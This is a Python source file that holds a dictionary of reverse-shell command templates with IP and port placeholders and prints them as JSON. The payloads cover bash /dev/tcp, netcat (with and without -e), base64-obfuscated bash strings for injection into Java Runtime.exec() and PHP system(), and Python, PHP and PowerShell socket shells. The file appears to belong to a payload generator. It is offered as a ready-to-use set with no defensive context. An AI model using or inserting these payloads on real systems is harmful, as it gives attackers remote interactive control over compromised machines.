import json

shell_template = {
  "bash-1": {
    "description": "bash -i",
    "template": "bash -i >& /dev/tcp/{{ip}}/{{port}} 0>&1"
  },
  "bash-2": {
    "description": "bash tcp",
    "template": "/bin/bash -l > /dev/tcp/{{ip}}/{{port}} 0<&1 2>&1"
  },
  "nc-1": {
    "description": "nc -e",
    "template": "nc -e /bin/sh {{ip}} {{port}}"
  },
  "nc-2": {
    "description": "nc without -e",
    "template": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {{ip}} {{port}} >/tmp/f"
  },
  "bash-in-java-1-linux": {
    "description": "Method 1: Linux: Bash in JAVA Runtime.getRuntime().exec()",
    "template": "bash -c {echo,BASE64(bash -i >\\& /dev/tcp/{{ip}}/{{port}} 0>&1)}|{base64,-d}|{bash,-i}"
  },
  "bash-in-java-1-mac": {
    "description": "Method 1: Mac: Bash in JAVA Runtime.getRuntime().exec()",
    "template": "bash -c {echo,BASE64(bash -i >& /dev/tcp/{{ip}}/{{port}} 0>&1)}|{base64,-D}|{bash,-i}"
  },
  "bash-in-java-2": {
    "description": "Method 2: Bash in JAVA Runtime.getRuntime().exec()",
    "template": "bash -c bash${IFS}-i${IFS}>&/dev/tcp/{{ip}}/{{port}}<&1"
  },
  "bash-in-java-3": {
    "description": "Method 3: Bash in JAVA Runtime.getRuntime().exec()",
    "template": "bash -c $@|bash 0 echo bash -i >& /dev/tcp/{{ip}}/{{port}} 0>&1"
  },
  "bash-in-php-system": {
    "description": "Bash in PHP system()",
    "template": "bash -c \"bash -i >& /dev/tcp/{{ip}}/{{port}} 0>&1\""
  },
  "python2-1": {
    "description": "Python2",
    "template": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{{ip}}\",{{port}}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' "
  },
"python3-1": {
    "description": "Python3",
    "template": '''python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{{ip}}",{{port}}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")' '''
  },
  "php-1": {
    "description": "PHP system",
    "template": "php -r '$sock=fsockopen(\"{{ip}}\",{{port}});system(\"sh <&3 >&3 2>&3\");' "
  },
  "powershell-1": {
    "description": "PowerShell",
    "template": '''$client = New-Object System.Net.Sockets.TCPClient("{{ip}}",{{port}});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()''',
  },
  "spawning-tty": {
    "description": "Spawning Shells",
    "template": '''python -c 'import pty; pty.spawn("/bin/bash")' '''
  }
}

print(json.dumps(shell_template, indent=2))